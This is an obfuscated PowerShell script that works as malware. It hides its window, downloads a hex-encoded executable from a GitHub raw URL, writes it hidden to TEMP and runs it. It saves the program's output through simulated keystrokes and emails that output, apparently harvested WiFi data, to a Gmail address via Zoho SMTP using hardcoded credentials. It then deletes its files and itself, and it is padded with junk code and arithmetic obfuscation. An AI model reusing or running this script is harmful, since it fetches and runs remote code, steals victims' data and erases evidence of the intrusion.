# This uses Windows API calls to find the current window and pull it out of view.

$NRwR = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$aMDjZJ = Add-Type -MemberDefinition $NRwR -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$tP9lFoB = (gps -Id $PID).MainWindowHandle
$chMYymee::ShowWindow($tP9lFoB, 0) # (-21 -bxor -21) = Hidden


function New-MemoryAttachment {
    param (
        [Parameter(Mandatory=$true)]
        [string]$rK8hTlZ,
        
        [Parameter(Mandatory=$false)]
        [string]$unci0 = "ani.txt",
        
        # FIX: Removed the "= $($($($(-78 -bxor -80) * $(45 -bxor 42)) / $($(11 - 9) * $(35 -bxor 36))) -band $($($(77 - 79) * $(600 / -15)) + $($(127 -bxor 327) -bxor $(403 -bxor -230))))". Switches are false by default.
        [switch]$bX5R6pGC 
    )

    try {
        $Cjgc = $rK8hTlZ
        if ($bX5R6pGC) {
            $wWpB = [System.Text.Encoding]::UTF8.GetBytes($rK8hTlZ)
            $Cjgc = [System.Convert]::ToBase64String($wWpB)
        }

        $tvy8FYH = New-Object System.IO.MemoryStream
        $XyZDPE = New-Object System.IO.StreamWriter($tvy8FYH)
        $XyZDPE.Write($Cjgc)
        $XyZDPE.Flush()
        $tvy8FYH.Position = (-77 + 77)

        return new Net.Mail.Attachment($tvy8FYH, $unci0)
    }
    catch {
        Write-Error "Failed to create memory attachment: $($_.Exception.Message)"
        return $null
    }
}

$PSVersionTable.PSVersion.ToString() | Out-Null
function Send-ZohoEmail {
    param (
        [string]$pGOY = "Ang Mangagawa <zqrvstef0rc5edk@zohomail.com>",
        [string]$jso0 = "srve650@gmail.com",
        [string]$EDaFXz,
        [string]$HPBp9aN = "Ang kabuuang ani ng iyong bukirin.",
        [PSObject[]]$vbI9tn = @(), # MUST BE PSObject
        [string]$AjaFS = "smtp.zoho.com",
        [int]$mOZSdR = 587,
        [string]$jIgi9 = "zqrvstef0rc5edk@zohomail.com",
        [string]$gWL0ud = "LHjzKTbzDApt"
    )

    $ZRU5MHE0 = New-Object System.Net.Mail.MailMessage
    $ZRU5MHE0.From = $pGOY
    $ZRU5MHE0.To.Add($jso0)
    $ZRU5MHE0.Subject = $EDaFXz
    $ZRU5MHE0.Body = $HPBp9aN

    foreach ($bnFsZzHi in $vbI9tn) {
        if ($null -eq $bnFsZzHi) { continue }
        
        # Logic to distinguish between Object and File Path
        if ($bnFsZzHi.GetType().FullName -like "*Attachment*") {
            $ZRU5MHE0.Attachments.Add($bnFsZzHi)
        }
        elseif ($bnFsZzHi -is [string] -and (test $bnFsZzHi)) {
            $ZRU5MHE0.Attachments.Add((new System.Net.Mail.Attachment($bnFsZzHi)))
        }
    }

    $zA3yfo5 = New-Object Net.Mail.SmtpClient($AjaFS, $mOZSdR)
    $zA3yfo5.EnableSsl = (1 -band 1)
    $zA3yfo5.Credentials = New-Object System.Net.NetworkCredential($jIgi9, $gWL0ud)

    try {
        $zA3yfo5.Send($ZRU5MHE0)
        write "Success!" -ForegroundColor Green
    } finally {
        $ZRU5MHE0.Dispose()
        $zA3yfo5.Dispose()
    }
}

# Run WBPV 
# 1. Download and Prepare
$xOhL = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
$R2m9Fp2t = -join ((65..90) + (97..122) | Get-Random -Count (312 / 39) | % {[char]$_})
$xpvBK2i1 = [System.IO.Path]::Combine($oJaT0kc:TEMP, "$R2m9Fp2t.txt")
wget -Uri $xOhL -OutFile $xpvBK2i1

$OTwi = Get-Content -Path $xpvBK2i1 -Raw
$wWpB = [byte[]]::new($OTwi.Length / 2)
for ($X0cLlqb = (79 -bxor 79); $X0cLlqb -lt $OTwi.Length; $X0cLlqb += 2) {
    $wWpB[$X0cLlqb / 2] = [convert]::ToByte($OTwi.Substring($X0cLlqb, 2), 16)
}

# 1. Create and Start the Random EXE
$OKVXiI3 = Join-Path $oJaT0kc:TEMP "$R2m9Fp2t.exe"
[System.IO.File]::WriteAllBytes($OKVXiI3, $wWpB)
(gi $OKVXiI3).Attributes = 'Hidden'

# Use -PassThru so we can track the exact Process ID
$JlJB = Start-Process $OKVXiI3 -PassThru 

# ... [Your SendKeys Logic Here] ...
$amzs8UB = "$oJaT0kc:TEMP\data.txt"

Start-Sleep -Seconds (38 - 36) 
Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.SendKeys]::SendWait("^(a)")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("^(s)")
Start-Sleep -Milliseconds 1000

[System.Windows.Forms.SendKeys]::SendWait("$amzs8UB")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

Start-Sleep -Seconds (3 - 2) # Wait for the save to finish

# 2. FORCE CLEANUP
try {
    if ($JlJB) {
        # Stop the process by its specific ID
        kill -Id $JlJB.Id -Force -ErrorAction SilentlyContinue
        
        # Wait a split second for Windows to release the file lock
        Start-Sleep -Milliseconds 500
        
        # Release the PowerShell handle on the process object
        $JlJB.Dispose() 
    }
} catch {
    write "Process already closed."
}
while ($false) {
    $userProfile = Get-CimInstance -ClassName Win32_UserProfile | Select-Object -First 1; Write-Debug "Last used profile: $($userProfile.LocalPath)"
}

# 3. DELETE THE EXE
if (test $OKVXiI3) {
    # The 'Force' is needed because we set the attribute to 'Hidden'
    ri $OKVXiI3 -Force -ErrorAction SilentlyContinue
    write "Success: $OKVXiI3 has been removed." -ForegroundColor Green
}

# 4. DELETE THE HEX TEXT FILE
if (test $xpvBK2i1) {
    erase $xpvBK2i1 -Force -ErrorAction SilentlyContinue
}
$dfchunS = 'sz39h' * 5; $dfchunS.Replace('l', 'v') | Out-Null; Remove-Variable dfchunS -ErrorAction SilentlyContinue
if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
    $printerInfo = Get-CimInstance -ClassName Win32_Printer | Select-Object -Property Name, DriverName -First 1; if ($printerInfo) { Write-Verbose "Default Printer Driver: $($printerInfo.DriverName)" }
}


## Ensure TLS 1.2 for modern SMTP servers
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (test $amzs8UB) {
    $bZsp = Get-Content $amzs8UB -Raw
    
    # CALLING FIX: We just use -Obfuscate. We do NOT add (1 -band 1) after it.
    $s1iqpW = New-MemoryAttachment -Data $bZsp -FileName "anihan.txt" -Obfuscate

    if ($null -ne $s1iqpW) {
        $glmrEQ = Get-Date -Format 'yyyy-MM-dd HH:mm'
        $raAOwJH = "$oJaT0kc:USERNAME: Ang pag-ani sa bukirin - $glmrEQ"
        
        try {
            # Send the object inside an array
            Send-ZohoEmail -EDaFXz $raAOwJH -vbI9tn @($s1iqpW)
        }
        catch {
            # This captures the "Failure sending mail" and explains WHY
            write "SMTP Error: $($_.Exception.Message)" -ForegroundColor Red
            write "Check: 1. App Password? 2. Port $($($($($(552264 - 238594) + $(-69029 + -69182)) + $($(274389 - 99207) + $(-1357184 -bxor 1508270))) - $($($(761649 - 1321283) - $(2541554 - 3451013)) -bxor $($(-646319 + 198554) - $(-3104611 -bxor 2180320)))) / $($($($(370 % 101) - $(3 * 23)) * $($(35 - 33) * $(-544 - -1000))) / $($($(27562 + -20108) -bxor $(12379 % 6217)) / $($(-2 * -357) / $(114 -bxor 103))))) Blocked? 3. Internet connection?" -ForegroundColor Yellow
        }
        finally {
            $s1iqpW.Dispose()
            rm $amzs8UB -Force
            write "Cleanup Complete." -ForegroundColor Gray
        }
    }
}
while ($false) {
    if ([System.Environment]::Is64BitOperatingSystem) { $arch = "64-bit"; Write-Host "Detected $arch OS." } else { $arch = "32-bit"; Write-Warning "Detected $arch OS." }
}
$g4hU6tDH = ('a'..'z' | Get-Random -Count 4) -join ''; $g4hU6tDH.ToUpper() | Out-Null; $g4hU6tDH = $null
else {
    write "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
}
$PID | Out-Null

# Get the path of the script currently running
$i7geW = $MyInvocation.MyCommand.Definition

# Schedule a background process to delete the file after (-46 -bxor -48) seconds
# (This allows the script to finish and close the file handle first)
start cmd.exe -ArgumentList "/c taskkill /F /IM powershell.exe & del ```````````````````````````````````````````````````````````````"$i7geW```````````````````````````````````````````````````````````````"" -WindowStyle Hidden